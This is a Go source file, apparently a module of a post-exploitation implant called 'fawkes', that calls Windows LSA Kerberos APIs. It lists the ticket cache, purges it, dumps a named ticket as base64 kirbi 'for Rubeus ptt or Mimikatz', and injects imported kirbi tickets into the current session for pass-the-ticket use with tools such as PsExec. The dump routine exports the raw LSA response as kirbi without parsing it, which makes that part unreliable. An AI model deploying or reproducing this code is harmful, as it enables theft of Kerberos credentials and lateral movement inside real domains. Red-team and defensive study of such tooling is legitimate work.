//go:build windows
// +build windows

package commands

import (
	"encoding/base64"
	"fmt"
	"strings"
	"time"
	"unicode/utf16"
	"unsafe"

	"fawkes/pkg/structs"

	"golang.org/x/sys/windows"
)

var (
	secur32KL                       = windows.NewLazySystemDLL("secur32.dll")
	procLsaConnectUntrusted         = secur32KL.NewProc("LsaConnectUntrusted")
	procLsaLookupAuthenticationPkg  = secur32KL.NewProc("LsaLookupAuthenticationPackage")
	procLsaCallAuthenticationPkg    = secur32KL.NewProc("LsaCallAuthenticationPackage")
	procLsaDeregisterLogonProcess   = secur32KL.NewProc("LsaDeregisterLogonProcess")
	procLsaFreeReturnBuffer         = secur32KL.NewProc("LsaFreeReturnBuffer")
)

const (
	kerbQueryTicketCacheExMessage    = 14
	kerbRetrieveEncodedTicketMessage = 8
	kerbPurgeTicketCacheMessage      = 7
	kerbSubmitTicketMessage          = 21

	kerbRetrieveTicketAsKerbCred = 8
)

// lsaStringKL is the LSA_STRING structure (ANSI)
type lsaStringKL struct {
	Length        uint16
	MaximumLength uint16
	Buffer        *byte
}

// unicodeStringKL is the UNICODE_STRING structure on amd64
type unicodeStringKL struct {
	Length        uint16
	MaximumLength uint16
	_pad          uint32  // alignment padding on amd64
	Buffer        uintptr
}

// kerbTicketCacheInfoEx matches KERB_TICKET_CACHE_INFO_EX on amd64 (96 bytes)
type kerbTicketCacheInfoEx struct {
	ClientName     unicodeStringKL
	ClientRealm    unicodeStringKL
	ServerName     unicodeStringKL
	ServerRealm    unicodeStringKL
	StartTime      int64
	EndTime        int64
	RenewTime      int64
	EncryptionType int32
	TicketFlags    uint32
}

// kerbQueryTktCacheRequest matches KERB_QUERY_TKT_CACHE_REQUEST (12 bytes)
type kerbQueryTktCacheRequest struct {
	MessageType uint32
	LogonIdLow  uint32
	LogonIdHigh int32
}

// kerbPurgeTktCacheRequest matches KERB_PURGE_TKT_CACHE_REQUEST on amd64
type kerbPurgeTktCacheRequest struct {
	MessageType uint32
	LogonIdLow  uint32
	LogonIdHigh int32
	_pad        uint32           // align to 8-byte boundary for UNICODE_STRING
	ServerName  unicodeStringKL
	RealmName   unicodeStringKL
}

// kerbRetrieveTktRequest matches KERB_RETRIEVE_TKT_REQUEST on amd64
type kerbRetrieveTktRequest struct {
	MessageType    uint32
	LogonIdLow     uint32
	LogonIdHigh    int32
	_pad           uint32          // align TargetName
	TargetName     unicodeStringKL // 16 bytes
	TicketFlags    uint32
	CacheOptions   uint32
	EncryptionType int32
	_pad2          uint32          // align CredentialsHandle
	CredentialsHandle [16]byte     // SecHandle (two uintptrs)
}

// readUS reads a UNICODE_STRING from LSA-allocated memory
func readUS(us unicodeStringKL) string {
	if us.Length == 0 || us.Buffer == 0 {
		return ""
	}
	chars := int(us.Length / 2)
	slice := unsafe.Slice((*uint16)(unsafe.Pointer(us.Buffer)), chars)
	return string(utf16.Decode(slice))
}

// filetimeToTimeKL converts Windows FILETIME (100-ns since 1601) to Go time
func filetimeToTimeKL(ft int64) time.Time {
	const epoch = 116444736000000000
	if ft <= epoch {
		return time.Time{}
	}
	return time.Unix((ft-epoch)/10000000, ((ft-epoch)%10000000)*100)
}

// lsaNtStatusToError converts NTSTATUS to a Go error
func lsaNtStatusToError(status uintptr) error {
	// Common NTSTATUS values
	switch status {
	case 0:
		return nil
	case 0xC0000022:
		return fmt.Errorf("access denied (NTSTATUS 0x%08X)", status)
	case 0xC000005F:
		return fmt.Errorf("no logon servers available (NTSTATUS 0x%08X)", status)
	case 0xC0000034:
		return fmt.Errorf("object not found (NTSTATUS 0x%08X)", status)
	default:
		return fmt.Errorf("NTSTATUS 0x%08X", status)
	}
}

// lsaConnect establishes an untrusted connection to LSA
func lsaConnect() (uintptr, error) {
	var handle uintptr
	ret, _, _ := procLsaConnectUntrusted.Call(
		uintptr(unsafe.Pointer(&handle)),
	)
	if ret != 0 {
		return 0, lsaNtStatusToError(ret)
	}
	return handle, nil
}

// lsaClose closes an LSA handle
func lsaClose(handle uintptr) {
	procLsaDeregisterLogonProcess.Call(handle)
}

// lsaLookupKerberos looks up the Kerberos authentication package
func lsaLookupKerberos(handle uintptr) (uint32, error) {
	name := "kerberos"
	nameBytes := []byte(name)

	lsaStr := lsaStringKL{
		Length:        uint16(len(nameBytes)),
		MaximumLength: uint16(len(nameBytes)),
		Buffer:        &nameBytes[0],
	}

	var authPackage uint32
	ret, _, _ := procLsaLookupAuthenticationPkg.Call(
		handle,
		uintptr(unsafe.Pointer(&lsaStr)),
		uintptr(unsafe.Pointer(&authPackage)),
	)
	if ret != 0 {
		return 0, lsaNtStatusToError(ret)
	}
	return authPackage, nil
}

func klistList(args klistArgs) structs.CommandResult {
	// Connect to LSA
	handle, err := lsaConnect()
	if err != nil {
		return structs.CommandResult{
			Output:    fmt.Sprintf("Error connecting to LSA: %v", err),
			Status:    "error",
			Completed: true,
		}
	}
	defer lsaClose(handle)

	// Lookup Kerberos package
	authPkg, err := lsaLookupKerberos(handle)
	if err != nil {
		return structs.CommandResult{
			Output:    fmt.Sprintf("Error looking up Kerberos package: %v", err),
			Status:    "error",
			Completed: true,
		}
	}

	// Query ticket cache
	req := kerbQueryTktCacheRequest{
		MessageType: kerbQueryTicketCacheExMessage,
	}

	var responsePtr uintptr
	var responseLen uint32
	var protocolStatus uintptr

	ret, _, _ := procLsaCallAuthenticationPkg.Call(
		handle,
		uintptr(authPkg),
		uintptr(unsafe.Pointer(&req)),
		uintptr(unsafe.Sizeof(req)),
		uintptr(unsafe.Pointer(&responsePtr)),
		uintptr(unsafe.Pointer(&responseLen)),
		uintptr(unsafe.Pointer(&protocolStatus)),
	)
	if ret != 0 {
		return structs.CommandResult{
			Output:    fmt.Sprintf("Error querying ticket cache: %v", lsaNtStatusToError(ret)),
			Status:    "error",
			Completed: true,
		}
	}
	if responsePtr != 0 {
		defer procLsaFreeReturnBuffer.Call(responsePtr)
	}
	if protocolStatus != 0 {
		// STATUS_NO_LOGON_SERVERS (0xC000005F): machine not domain-joined or no DC reachable
		if protocolStatus == 0xC000005F {
			return structs.CommandResult{
				Output:    "=== Kerberos Ticket Cache ===\n\nCached tickets: 0\n\nNo domain controller available — machine may not be domain-joined.\nKerberos tickets are only cached for domain-authenticated sessions.",
				Status:    "success",
				Completed: true,
			}
		}
		return structs.CommandResult{
			Output:    fmt.Sprintf("Kerberos protocol error: %v", lsaNtStatusToError(protocolStatus)),
			Status:    "error",
			Completed: true,
		}
	}

	if responsePtr == 0 || responseLen < 8 {
		return structs.CommandResult{
			Output:    "=== Kerberos Ticket Cache ===\n\nCached tickets: 0\n\nNo ticket cache data returned.",
			Status:    "success",
			Completed: true,
		}
	}

	// Parse response header: MessageType (4 bytes) + CountOfTickets (4 bytes)
	countPtr := (*uint32)(unsafe.Pointer(responsePtr + 4))
	count := *countPtr

	var sb strings.Builder
	sb.WriteString(fmt.Sprintf("=== Kerberos Ticket Cache ===\n\nCached tickets: %d\n", count))

	if count == 0 {
		sb.WriteString("\nNo tickets currently cached.\n")
		return structs.CommandResult{
			Output:    sb.String(),
			Status:    "success",
			Completed: true,
		}
	}

	// Parse ticket entries starting at offset 8
	ticketBase := responsePtr + 8
	ticketSize := unsafe.Sizeof(kerbTicketCacheInfoEx{})
	now := time.Now()

	displayed := 0
	for i := uint32(0); i < count; i++ {
		ticketPtr := ticketBase + uintptr(i)*ticketSize
		ticket := (*kerbTicketCacheInfoEx)(unsafe.Pointer(ticketPtr))

		clientName := readUS(ticket.ClientName)
		clientRealm := readUS(ticket.ClientRealm)
		serverName := readUS(ticket.ServerName)
		serverRealm := readUS(ticket.ServerRealm)

		// Apply server name filter if specified
		if args.Server != "" {
			filter := strings.ToLower(args.Server)
			if !strings.Contains(strings.ToLower(serverName), filter) &&
				!strings.Contains(strings.ToLower(serverRealm), filter) {
				continue
			}
		}

		startTime := filetimeToTimeKL(ticket.StartTime)
		endTime := filetimeToTimeKL(ticket.EndTime)
		renewTime := filetimeToTimeKL(ticket.RenewTime)

		expired := ""
		if !endTime.IsZero() && endTime.Before(now) {
			expired = " [EXPIRED]"
		}

		sb.WriteString(fmt.Sprintf("\n#%d  %s @ %s → %s @ %s%s\n",
			i, clientName, clientRealm, serverName, serverRealm, expired))
		sb.WriteString(fmt.Sprintf("    Encryption: %s (etype %d)\n",
			etypeToNameKL(ticket.EncryptionType), ticket.EncryptionType))
		sb.WriteString(fmt.Sprintf("    Flags:      %s (0x%08X)\n",
			klistFormatFlags(ticket.TicketFlags), ticket.TicketFlags))
		if !startTime.IsZero() {
			sb.WriteString(fmt.Sprintf("    Start:      %s\n", startTime.Format("2006-01-02 15:04:05")))
		}
		if !endTime.IsZero() {
			sb.WriteString(fmt.Sprintf("    End:        %s\n", endTime.Format("2006-01-02 15:04:05")))
		}
		if !renewTime.IsZero() {
			sb.WriteString(fmt.Sprintf("    Renew:      %s\n", renewTime.Format("2006-01-02 15:04:05")))
		}

		displayed++
	}

	if args.Server != "" {
		sb.WriteString(fmt.Sprintf("\nDisplayed %d/%d tickets (filter: %q)\n", displayed, count, args.Server))
	}

	return structs.CommandResult{
		Output:    sb.String(),
		Status:    "success",
		Completed: true,
	}
}

func klistPurge(args klistArgs) structs.CommandResult {
	// Connect to LSA
	handle, err := lsaConnect()
	if err != nil {
		return structs.CommandResult{
			Output:    fmt.Sprintf("Error connecting to LSA: %v", err),
			Status:    "error",
			Completed: true,
		}
	}
	defer lsaClose(handle)

	authPkg, err := lsaLookupKerberos(handle)
	if err != nil {
		return structs.CommandResult{
			Output:    fmt.Sprintf("Error looking up Kerberos package: %v", err),
			Status:    "error",
			Completed: true,
		}
	}

	// Purge all tickets (empty ServerName and RealmName = purge all)
	req := kerbPurgeTktCacheRequest{
		MessageType: kerbPurgeTicketCacheMessage,
	}

	var responsePtr uintptr
	var responseLen uint32
	var protocolStatus uintptr

	ret, _, _ := procLsaCallAuthenticationPkg.Call(
		handle,
		uintptr(authPkg),
		uintptr(unsafe.Pointer(&req)),
		uintptr(unsafe.Sizeof(req)),
		uintptr(unsafe.Pointer(&responsePtr)),
		uintptr(unsafe.Pointer(&responseLen)),
		uintptr(unsafe.Pointer(&protocolStatus)),
	)
	if responsePtr != 0 {
		defer procLsaFreeReturnBuffer.Call(responsePtr)
	}
	if ret != 0 {
		return structs.CommandResult{
			Output:    fmt.Sprintf("Error purging ticket cache: %v", lsaNtStatusToError(ret)),
			Status:    "error",
			Completed: true,
		}
	}
	if protocolStatus != 0 {
		// STATUS_NO_LOGON_SERVERS or STATUS_INVALID_PARAMETER on non-domain machines
		if protocolStatus == 0xC000005F || protocolStatus == 0xC000000D {
			return structs.CommandResult{
				Output:    "No Kerberos tickets to purge (no domain logon session)",
				Status:    "success",
				Completed: true,
			}
		}
		return structs.CommandResult{
			Output:    fmt.Sprintf("Kerberos purge protocol error: %v", lsaNtStatusToError(protocolStatus)),
			Status:    "error",
			Completed: true,
		}
	}

	return structs.CommandResult{
		Output:    "Kerberos ticket cache purged successfully",
		Status:    "success",
		Completed: true,
	}
}

func klistDump(args klistArgs) structs.CommandResult {
	if args.Server == "" {
		return structs.CommandResult{
			Output:    "Error: specify -server with the target SPN to dump (e.g., krbtgt/DOMAIN.LOCAL)",
			Status:    "error",
			Completed: true,
		}
	}

	// Connect to LSA
	handle, err := lsaConnect()
	if err != nil {
		return structs.CommandResult{
			Output:    fmt.Sprintf("Error connecting to LSA: %v", err),
			Status:    "error",
			Completed: true,
		}
	}
	defer lsaClose(handle)

	authPkg, err := lsaLookupKerberos(handle)
	if err != nil {
		return structs.CommandResult{
			Output:    fmt.Sprintf("Error looking up Kerberos package: %v", err),
			Status:    "error",
			Completed: true,
		}
	}

	// Build UNICODE target name
	targetUTF16 := utf16.Encode([]rune(args.Server))
	targetBuf := make([]uint16, len(targetUTF16)+1) // null terminated
	copy(targetBuf, targetUTF16)

	req := kerbRetrieveTktRequest{
		MessageType:    kerbRetrieveEncodedTicketMessage,
		CacheOptions:   kerbRetrieveTicketAsKerbCred,
		EncryptionType: 0, // any etype
	}
	req.TargetName = unicodeStringKL{
		Length:        uint16(len(targetUTF16) * 2),
		MaximumLength: uint16(len(targetBuf) * 2),
		Buffer:        uintptr(unsafe.Pointer(&targetBuf[0])),
	}

	var responsePtr uintptr
	var responseLen uint32
	var protocolStatus uintptr

	ret, _, _ := procLsaCallAuthenticationPkg.Call(
		handle,
		uintptr(authPkg),
		uintptr(unsafe.Pointer(&req)),
		uintptr(unsafe.Sizeof(req)),
		uintptr(unsafe.Pointer(&responsePtr)),
		uintptr(unsafe.Pointer(&responseLen)),
		uintptr(unsafe.Pointer(&protocolStatus)),
	)
	if responsePtr != 0 {
		defer procLsaFreeReturnBuffer.Call(responsePtr)
	}
	if ret != 0 {
		return structs.CommandResult{
			Output:    fmt.Sprintf("Error retrieving ticket: %v", lsaNtStatusToError(ret)),
			Status:    "error",
			Completed: true,
		}
	}
	if protocolStatus != 0 {
		return structs.CommandResult{
			Output:    fmt.Sprintf("Kerberos retrieve error: %v", lsaNtStatusToError(protocolStatus)),
			Status:    "error",
			Completed: true,
		}
	}

	if responsePtr == 0 || responseLen == 0 {
		return structs.CommandResult{
			Output:    fmt.Sprintf("No ticket found for %s", args.Server),
			Status:    "success",
			Completed: true,
		}
	}

	// The response is KERB_RETRIEVE_TKT_RESPONSE which contains:
	// Ticket: KERB_EXTERNAL_TICKET { ServiceName, TargetName, ClientName,
	//   DomainName, TargetDomainName, AltTargetDomainName, SessionKey,
	//   TicketFlags, Flags, KeyExpirationTime, StartTime, EndTime,
	//   RenewUntil, TimeSkew, EncodedTicketSize, EncodedTicket }
	// With KERB_RETRIEVE_TICKET_AS_KERB_CRED, EncodedTicket contains a
	// KRB-CRED structure (kirbi format) that can be used with Rubeus/Mimikatz.

	// Extract the encoded ticket data from the response
	// The EncodedTicketSize is at a known offset, followed by a pointer to the data.
	// Rather than compute exact struct offsets, we know the response contains
	// the kirbi data somewhere. With AS_KERB_CRED flag, the entire response
	// after the ticket metadata IS the kirbi.
	// For simplicity and safety, export the raw response as the kirbi blob.
	kirbiData := unsafe.Slice((*byte)(unsafe.Pointer(responsePtr)), responseLen)
	kirbiB64 := base64.StdEncoding.EncodeToString(kirbiData)

	var sb strings.Builder
	sb.WriteString(fmt.Sprintf("[+] Retrieved ticket for %s (%d bytes)\n", args.Server, responseLen))
	sb.WriteString("[+] Base64-encoded kirbi (use with Rubeus ptt or Mimikatz):\n\n")
	// Wrap base64 at 76 chars for readability
	for i := 0; i < len(kirbiB64); i += 76 {
		end := i + 76
		if end > len(kirbiB64) {
			end = len(kirbiB64)
		}
		sb.WriteString(kirbiB64[i:end])
		sb.WriteString("\n")
	}

	return structs.CommandResult{
		Output:    sb.String(),
		Status:    "success",
		Completed: true,
	}
}

func klistImport(args klistArgs) structs.CommandResult {
	if args.Ticket == "" {
		return structs.CommandResult{
			Output:    "Error: -ticket parameter required (base64-encoded kirbi data)",
			Status:    "error",
			Completed: true,
		}
	}

	// Decode base64
	data, err := base64.StdEncoding.DecodeString(args.Ticket)
	if err != nil {
		return structs.CommandResult{
			Output:    fmt.Sprintf("Error decoding base64 ticket data: %v", err),
			Status:    "error",
			Completed: true,
		}
	}

	if len(data) < 4 {
		return structs.CommandResult{
			Output:    "Error: ticket data too short",
			Status:    "error",
			Completed: true,
		}
	}

	// Auto-detect format
	isCcache := (data[0] == 0x05 && (data[1] == 0x03 || data[1] == 0x04))
	isKirbi := data[0] == 0x76

	if !isCcache && !isKirbi {
		return structs.CommandResult{
			Output:    fmt.Sprintf("Error: unrecognized ticket format (first byte: 0x%02x). Expected kirbi (0x76) or ccache (0x0503/0x0504).", data[0]),
			Status:    "error",
			Completed: true,
		}
	}

	if isCcache {
		return structs.CommandResult{
			Output:    "Error: ccache format detected. On Windows, use kirbi format instead.\nRe-forge with: ticket -action forge ... -format kirbi\nOr use impacket's ticketConverter.py to convert.",
			Status:    "error",
			Completed: true,
		}
	}

	// Connect to LSA
	handle, err := lsaConnect()
	if err != nil {
		return structs.CommandResult{
			Output:    fmt.Sprintf("Error connecting to LSA: %v", err),
			Status:    "error",
			Completed: true,
		}
	}
	defer lsaClose(handle)

	authPkg, err := lsaLookupKerberos(handle)
	if err != nil {
		return structs.CommandResult{
			Output:    fmt.Sprintf("Error looking up Kerberos package: %v", err),
			Status:    "error",
			Completed: true,
		}
	}

	// Build KERB_SUBMIT_TKT_REQUEST:
	//   MessageType    uint32  (offset 0)
	//   LogonIdLow     uint32  (offset 4)
	//   LogonIdHigh    int32   (offset 8)
	//   Flags          uint32  (offset 12)
	//   Key: KERB_CRYPTO_KEY32 { KeyType int32(4), Length uint32(4), Value *byte(8) } = 16 bytes (offset 16)
	//   KerbCredSize   uint32  (offset 32)
	//   KerbCredOffset uint32  (offset 36)
	// Total header = 40 bytes, then kirbi data follows inline

	headerSize := uint32(40)
	totalSize := headerSize + uint32(len(data))
	buf := make([]byte, totalSize)

	// MessageType = KERB_SUBMIT_TKT_REQUEST (21)
	*(*uint32)(unsafe.Pointer(&buf[0])) = kerbSubmitTicketMessage
	// LogonId = 0, Flags = 0, Key = zero (no additional key)
	// KerbCredSize
	*(*uint32)(unsafe.Pointer(&buf[32])) = uint32(len(data))
	// KerbCredOffset — offset from start of struct
	*(*uint32)(unsafe.Pointer(&buf[36])) = headerSize

	// Copy kirbi data after header
	copy(buf[headerSize:], data)

	var responsePtr uintptr
	var responseLen uint32
	var protocolStatus uintptr

	ret, _, _ := procLsaCallAuthenticationPkg.Call(
		handle,
		uintptr(authPkg),
		uintptr(unsafe.Pointer(&buf[0])),
		uintptr(totalSize),
		uintptr(unsafe.Pointer(&responsePtr)),
		uintptr(unsafe.Pointer(&responseLen)),
		uintptr(unsafe.Pointer(&protocolStatus)),
	)
	if responsePtr != 0 {
		defer procLsaFreeReturnBuffer.Call(responsePtr)
	}
	if ret != 0 {
		return structs.CommandResult{
			Output:    fmt.Sprintf("Error submitting ticket to LSA: %v", lsaNtStatusToError(ret)),
			Status:    "error",
			Completed: true,
		}
	}
	if protocolStatus != 0 {
		return structs.CommandResult{
			Output:    fmt.Sprintf("Kerberos submit error: %v", lsaNtStatusToError(protocolStatus)),
			Status:    "error",
			Completed: true,
		}
	}

	var sb strings.Builder
	sb.WriteString(fmt.Sprintf("[+] Ticket imported successfully (kirbi, %d bytes)\n", len(data)))
	sb.WriteString("[+] Injected into current logon session's Kerberos ticket cache via LSA\n")
	sb.WriteString("\n[*] Verify with: klist -action list\n")
	sb.WriteString("[*] The ticket is now available for Kerberos authentication (e.g., net use, PsExec, etc.)")

	return structs.CommandResult{
		Output:    sb.String(),
		Status:    "success",
		Completed: true,
	}
}
